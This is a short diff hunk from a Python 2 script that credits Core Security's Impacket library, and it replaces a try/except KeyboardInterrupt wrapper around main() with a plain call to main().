@@ -2171,10 +1748,6 @@ if __name__ == '__main__':
     print '(http://www.coresecurity.com), Python Impacket library'
 
     warnings.filterwarnings(action='ignore', category=DeprecationWarning)
-
-    try:
-        main()
-    except KeyboardInterrupt:
-        print '\nBye bye!'
+    main()
 
     sys.exit(0)
